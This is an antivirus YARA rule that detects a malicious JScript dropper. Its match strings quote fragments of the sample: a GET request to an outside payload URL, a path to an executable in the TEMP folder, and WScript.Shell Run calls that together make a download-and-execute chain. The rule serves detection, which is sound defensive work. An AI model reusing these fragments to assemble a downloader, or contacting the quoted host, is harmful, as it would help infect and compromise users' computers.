rule sig_20160329_b258052b893c7ccf7cb9646ff6c9e797 {
  meta:
    description = "datamaliciousorder - file 20160329_b258052b893c7ccf7cb9646ff6c9e797.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "97486613a300e5b46dfae23be34b95eda06b0e95d663553dd7a8fe5dcbb84a59"

  strings:
    $s1  = "l0[Mc](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function E() {return S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XtBnJA7c9TC3.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[e](uH() * 11); if (l0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var S = function fV() {return WScript[RF](\"WScript.Shell\");}(), XN = 11;" fullword ascii
    $s5  = "function I(bi, Pv){hD = hD * 1; return bi - Pv;};" fullword ascii
    $s6  = "function g(){return \"\" + oV;};" fullword ascii
    $s7  = "function l() {return ((v == true) && (v == uV)) ? 1 : hD;};" fullword ascii
    $s8  = "function c(V){S[\"Run\"](V, hD, hD);};" fullword ascii
    $s9  = "function nm(){return RF;};" fullword ascii
    $s10 = "function uH(){return 22;};" fullword ascii
    $s11 = "return I(sO, je);" fullword ascii
    $s12 = "var qh = new this[\"Date\"]();" fullword ascii
    $s13 = "function fK(RD) {var qf = (1, 2, 3, 4, 5, RD); return qf;};" fullword ascii
    $s14 = " while (y){" fullword ascii
    $s15 = "function OF()" fullword ascii
    $s16 = "v = true; " fullword ascii
    $s17 = "var v = false;" fullword ascii
    $s18 = "var uV = false;" fullword ascii
    $s19 = "var y1 = false;" fullword ascii
    $s20 = "uV = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}